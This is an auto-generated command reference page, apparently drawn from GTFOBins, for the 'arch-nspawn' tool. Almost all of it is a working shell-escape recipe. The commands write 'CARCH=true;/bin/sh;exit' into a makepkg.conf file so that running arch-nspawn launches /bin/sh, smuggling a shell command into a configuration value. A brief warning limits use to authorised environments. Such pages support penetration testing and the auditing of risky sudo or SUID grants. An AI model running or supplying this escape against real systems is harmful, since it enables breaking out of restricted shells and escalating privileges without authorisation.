---
parsed_by: focuslocust
source: commands
type: generated
---
# arch-nspawn Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## arch-nspawn

Tool page: [arch-nspawn](../../tools/linux/arch-nspawn.md)

### shell

```text
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/arch-nspawn` |
| Evidence | Function example preserved from source parser. |
